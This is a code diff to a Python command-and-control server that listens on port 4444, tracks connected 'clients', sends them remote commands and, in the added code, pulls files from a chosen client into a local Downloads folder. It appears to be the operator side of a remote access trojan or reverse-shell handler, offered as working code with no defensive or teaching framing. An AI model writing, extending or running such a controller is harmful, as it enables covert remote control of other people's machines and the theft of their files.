@@ -4,7 +4,8 @@ import os
 import sys
 import time
 clientlen = 5
-server_ip = "127.0.0.1"
+rec_size = 1024*1024*100
+server_ip = "10.0.0.6"
 server_port = 4444
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.bind((server_ip,server_port))
@@ -18,7 +19,6 @@ def get_clients():
 		clients.append([client,addr])
 def get_response(sock):
 	recv_len = 1
-	recv_str = b"";
 	bdata = b"";
 	while recv_len > 0:
 		try:
@@ -32,6 +32,31 @@ def get_response(sock):
 		except:
 			break
 	print()
+def _download_file(fname,client_id):
+	global clients
+	#clients[client_id-1][0].settimeout(60*5)
+	out_file = open("Downloads"+"\\"+fname,"wb")
+	out_file.write(b"")
+	out_file.close()
+	clients[client_id-1][0].send(user_command.encode())
+	recv_len = 1
+	while recv_len > 0:
+		try:
+			out_file = open("Downloads"+"\\"+fname,"ab")
+			bdata = clients[client_id-1][0].recv(rec_size)
+			recv_len = len(bdata)
+			if len(bdata) > 0:
+				out_file.write(bdata)
+				out_file.close()
+				bdata = b""
+			else:
+				break
+			bdata = b""
+		except:
+			break
+	out_file.close()
+def download_file(fname,client_id):
+	threading.Thread(target=_download_file,args=(fname,client_id)).start()
 def list_clients():
 	global clients
 	i = 1
@@ -40,7 +65,7 @@ def list_clients():
 		i += 1
 threading.Thread(target=get_clients).start()
 while 1:
-	os.system("cls")
+	#os.system("cls")
 	print("1) List Clients")
 	print("2) Control Client")
 	got_response = False
@@ -67,6 +92,13 @@ while 1:
 					print('''Commands
 	pwd - Print out working directory
 	cd x - Change working directory to x (relative or absolute)''')
+					continue
+				elif user_command[:len("download")] == "download":
+					fname = user_command.strip().split()[1]
+					print("Downloading file \"%s\" to .\\downloads"%fname)
+					if not os.path.isdir("Downloads"):
+						os.mkdir("Downloads")
+					download_file(fname,client_id)
 					continue
 				clients[client_id-1][0].send(user_command.encode())
 				thr = threading.Thread(target=get_response,args=(clients[client_id-1][0],))
